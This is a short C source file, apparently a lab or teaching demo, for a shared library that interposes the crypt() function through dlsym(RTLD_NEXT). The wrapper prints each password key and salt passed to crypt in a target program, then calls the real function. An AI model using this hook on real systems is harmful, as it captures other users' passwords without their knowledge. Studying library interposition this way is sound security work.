#define _GNU_SOURCE
#define _XOPEN_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <dlfcn.h>
#include <unistd.h>

/* I hate the program implemented by target.c. I'm going to show you the
 * secret and the salt used for encryption! I'm going to do that with
 * dlsym and shared library interposition.
 */


/* This is the fake crypt. It makes a call to the real crypt, but before
 * it does that it prints out the secret key and the salt.
 */
char *
crypt ( const char *key, const char *salt ) 
{

	static void* (*real_crypt)(const char *, const char *) = NULL;

	if ( !real_crypt ) {
		real_crypt = dlsym(RTLD_NEXT, "crypt");
	}

	printf ( "Secret Collect! key: %s salt: %s\n", key, salt );

	return real_crypt( key, salt );
}
